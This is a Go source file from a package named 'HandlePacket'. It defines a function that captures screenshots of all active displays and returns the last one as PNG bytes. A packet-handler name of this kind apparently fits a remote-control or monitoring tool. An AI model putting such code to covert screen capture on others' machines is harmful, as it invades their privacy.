package HandlePacket

import (
	"bytes"
	"fmt"
	"image/png"

	"github.com/kbinani/screenshot"
)

func Screenshot() []byte {
	// Get the number of all displays
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		//fmt.Println("No display found")
		return nil
	}

	var imgBytes []byte
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Printf("Unable to capture the display %d: %v\n", i, err)
			continue
		}
		var buf bytes.Buffer
		err = png.Encode(&buf, img)
		if err != nil {
			fmt.Printf("Unable to encode screenshot: %v\n", err)
			continue
		}
		imgBytes = buf.Bytes()
		fmt.Printf("The screenshot of display %d has been converted to a byte array with a length of %d\n", i, len(imgBytes))
	}

	return imgBytes
}
